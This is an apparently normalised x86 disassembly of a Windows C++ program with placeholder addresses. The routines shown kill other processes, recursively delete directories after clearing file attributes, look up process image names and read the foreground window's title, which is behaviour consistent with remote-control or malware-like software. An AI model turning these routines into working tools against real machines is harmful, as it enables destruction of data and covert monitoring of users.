call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x80 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push [ ebp + 0x8 ]
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0xc444 ]
push 0xc350
push eax
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
cmp [ ebp - 0x3 ] bl
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0xb0 ]
push eax
lea eax [ ebp - 0xc444 ]
push [ ebp - 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0xb0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x3 ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
cmp [ ebp - 0x8 ] ebx
ja r-xdata
mov edi r--data
push ebx
push edi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
cmp [ ebp - 0x2 ] bl
je r-xdata
push [ ecx ]
lea ecx [ ebp + 0xc ]
push ebx
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
inc eax
lea ecx [ ebp + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xa0 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
push 0x22
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
push 0xffffffff
push [ ebp - 0x50 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x4c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x50 ]
call esi
jmp r-xdata
push ebx
push [ ebp - 0x50 ]
call [ TerminateProcess@IAT ]
xor edi edi
push ebx
lea edi [ eax + 0x1 ]
lea ecx [ ebp - 0x1c ]
push edi
push 0x22
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
dec eax
lea ecx [ ebp - 0x1c ]
dec eax
push eax
lea eax [ ebp - 0x90 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x90 ]
jmp r-xdata
push [ ebp - 0xc ]
call esi
push [ ebp - 0x20 ]
call esi
cmp [ ebp - 0x2 ] 0x1
pop edi
pop esi
pop ebx
jne r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x1c ]
push [ eax ]
lea eax [ ebp - 0x70 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x70 ]
inc edi
cmp al al
jne r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1c ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
pop ecx
test al al
mov ecx esi
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp eax 0x3
lea eax [ ebp - 0x1c ]
push eax
jbe r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp eax 0x3
jbe r-xdata
push edi
jmp r-xdata
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea eax [ ebp - 0x60 ]
push 0x5c
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@DABV10@@Z
add esp 0xc
mov ecx esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx esi
push [ eax ]
push 0x5c
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::rfind@IAT ]
push eax
lea eax [ ebp - 0x80 ]
push ebx
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
push 0x5c
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov al [ eax ]
cmp al 0x20
jne r-xdata
push 0x5c
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
jmp r-xdata
sub_40ecdd
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
push 0x0
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
push 0x0
push esi
call [ TerminateProcess@IAT ]
test eax eax
push esi
setne bl
call [ CloseHandle@IAT ]
mov al bl
pop esi
pop ebx
pop ebp
retn
sub_40ed0c
push ebp
mov ebp esp
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x1
push 0x0
push [ ebp + 0x8 ]
call esi
push eax
call [ GetCurrentThread@IAT ]
push eax
call esi
push eax
call [ DuplicateHandle@IAT ]
pop esi
pop ebp
retn
sub_40ed35
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x24 ] 0x0
push edi
push 0x8
xor eax eax
pop ecx
lea edi [ ebp - 0x23 ]
[ edi ]
lea eax [ ebp - 0x24 ]
push 0xa
push eax
push [ ebp + 0xc ]
call [ _itoa@IAT ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
sub_40ed73
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x1 ]
push eax
push 0x20
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_40f7e0
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40edd3
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0xc ]
push ebx
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
shl eax 0x1
push eax
push r--data
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0xc ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
mov ecx [ ebp + 0xc ]
mov ebx eax
shl ebx 0x1
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
lea ecx [ ebp - 0x14 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx ebx
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40ee4b
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
mov esi eax
inc esi
inc esi
lea eax [ esi + esi ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov ebx eax
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ ebp + 0xc ]
lea edi [ esi - 0x2 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
mov eax edi
mov edi ebx
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp + 0xf ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
call sub_40fc2c
pop ecx
lea eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40eed4
push ebp
mov ebp esp
sub esp 0x10
push esi
push 0x0
push [ ebp + 0x1c ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov esi eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp esi [ eax ]
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x20 ]
lea eax [ ebp + 0x1f ]
lea ecx [ ebp - 0x10 ]
push eax
push [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
push esi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::replace@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_40ef4b
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp + 0xf ]
push edi
push eax
push esi
lea ecx [ ebp - 0x10 ]
xor edi edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
push ebx
mov [ ebp + 0xc ] esi
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push edi
lea ecx [ ebp - 0x10 ]
mov ebx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov ecx [ ebp + 0xc ]
inc edi
dec [ ebp + 0xc ]
mov cl [ ebx + ecx - 0x1 ]
mov [ eax ] cl
cmp [ edi + esi ] 0x0
jne r-xdata
pop ebx
sub_40efb5
push ebp
mov ebp esp
sub esp 0x34
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x24 ]
push eax
call sub_403507
lea ecx [ ebp + 0xc ]
xor edi edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
test eax eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
call sub_40f5ef
lea ecx [ ebp - 0x24 ]
call sub_401b3c
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
lea eax [ ebp + 0x1c ]
push edi
push eax
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov esi eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp esi [ eax ]
je r-xdata
push [ eax ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp + 0xc ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
push eax
call sub_40f637
mov eax esi
lea ecx [ ebp + 0xc ]
sub eax edi
push eax
lea eax [ ebp - 0x34 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
push eax
call sub_40f637
lea ecx [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
add eax esi
lea ecx [ ebp + 0xc ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp edi eax
jb r-xdata
jmp r-xdata
sub_40f0b5
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
xor al al
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
push 0x1
pop eax
cmp [ ebp - 0x4 ] eax
je r-xdata
leave
retn
sub_40f0df
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
xor al al
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push 0x400
call [ OpenProcess@IAT ]
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ rw-data ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
sub_40f114
push ebp
mov ebp esp
sub esp 0x104
push [ ebp + 0xc ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
lea ecx [ ebp - 0x104 ]
push 0x104
push ecx
push 0x0
push eax
call [ rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp + 0xf ]
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40f16a
push ebp
mov ebp esp
sub esp 0x208
push [ ebp + 0xc ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
lea ecx [ ebp - 0x208 ]
push 0x208
push ecx
push 0x0
push eax
call [ rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp + 0xf ]
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40f1c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi r--data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0x1
pop eax
mov eax [ ebp + 0x8 ]
mov esi r--data
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
inc eax
inc eax
inc esi
inc esi
test cl cl
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
pop esi
pop ebp
retn
test eax eax
je r-xdata
inc eax
inc eax
inc esi
inc esi
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_40f234
push ebp
mov ebp esp
sub esp 0x350
push ebx
push esi
or ebx 0xffffffff
push edi
mov edi [ ebp + 0x8 ]
mov ecx ebx
xor eax eax
lea edx [ ebp - 0x210 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ ebp - 0x210 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi r--data
mov ecx ebx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
mov ecx ebx
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0x10c ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
mov ecx ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0x10c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi r--data
mov ecx ebx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
mov ecx ebx
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
lea eax [ ebp - 0x350 ]
mov ecx edx
push eax
and ecx 0x3
lea eax [ ebp - 0x210 ]
[ edi ] [ esi ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea edi [ ebp - 0x10c ]
mov ecx ebx
xor eax eax
lea edx [ ebp - 0x210 ]
[ edi ]
not ecx
sub edi ecx
mov [ ebp - 0x1 ] 0x1
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
lea eax [ ebp - 0x324 ]
push eax
call sub_40f1c0
test eax eax
pop ecx
jne r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
and [ ebp - 0x1 ] 0x0
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
lea edi [ ebp - 0x324 ]
mov ecx ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp - 0x10c ]
mov esi edi
mov edi edx
mov edx ecx
mov ecx ebx
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test [ ebp - 0x350 ] 0x10
[ edi ] [ esi ]
je r-xdata
lea eax [ ebp - 0x350 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
push [ ebp + 0x8 ]
call [ RemoveDirectoryA@IAT ]
test [ ebp - 0x350 ] 0x1
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
call sub_40f234
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x10c ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10c ]
push 0x80
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x10c ]
push eax
call [ RemoveDirectoryA@IAT ]
jmp r-xdata
lea edi [ ebp - 0x210 ]
mov ecx ebx
xor eax eax
lea edx [ ebp - 0x10c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
sub_40f44c
push ebp
mov ebp esp
sub esp 0x90
push 0x1
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x90 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea eax [ ebp - 0x90 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x4 ]
lea ecx [ ebp + eax - 0x90 ]
xor ecx ecx
jmp r-xdata
push ebx
call [ std::ios_base@IAT ]
test eax eax
lea ecx [ ebp - 0x90 ]
setne bl
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
mov al bl
pop ebx
leave
retn
sub_40f4a3
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
call [ GetForegroundWindow@IAT ]
mov esi eax
push esi
call [ GetWindowTextLengthA@IAT ]
test eax eax
jbe r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
lea ecx [ ebp - 0x1 ]
inc eax
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call [ GetWindowTextA@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
call sub_408667
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
